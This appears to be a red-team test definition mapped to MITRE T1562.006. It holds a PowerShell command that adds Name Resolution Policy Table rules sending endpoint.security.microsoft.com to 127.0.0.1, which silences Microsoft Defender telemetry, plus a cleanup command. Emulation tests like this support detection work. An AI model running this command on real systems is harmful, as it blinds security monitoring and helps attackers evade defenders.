- description: Adversaries are redirecting DNS queries to an incorrect or malicious
    DNS server IP, thereby blocking legitimate communications and potentially compromising
    the security infrastructure. This atomic test aims to respond with 127.0.0.1 when
    a DNS query is made for endpoint.security.microsoft.com.
  id: 641fd1bc-72c2-f123-0e12-9ed8981fd824
  name: Block Cybersecurity communication by leveraging Windows Name Resolution Policy
    Table
  platforms:
    windows:
      psh:
        cleanup: 'try {;         $DnsClientNrptRules = Get-DnsClientNrptRule | Where-Object
          { $_.Comment -eq ''Silenced by Name Resolution Policy Table'' };     ;         foreach
          ($rule in $DnsClientNrptRules) {;             Remove-DnsClientNrptRule -Name
          $rule.Name -Force;         };     ;     Clear-DnsClientCache;     Write-Host
          "All NRPT rules have been removed and the DNS cache has been cleared.";
          }; catch {;     Write-Host "An error occurred: $_"; }; Clear-DnsClientCache'
        command: Add-DnsClientNrptRule -Namespace ".endpoint.security.microsoft.com"
          -NameServers 127.0.0.1 -Comment "Silenced by Name Resolution Policy Table";
          Add-DnsClientNrptRule -Namespace "endpoint.security.microsoft.com" -NameServers
          127.0.0.1 -Comment "Silenced by Name Resolution Policy Table"; Clear-DnsClientCache
        parsers:
          plugins.atomic.app.parsers.atomic_powershell:
          - source: validate_me
        payloads: []
  tactic: defense-evasion
  technique:
    attack_id: T1562.006
    name: 'Impair Defenses: Indicator Blocking'
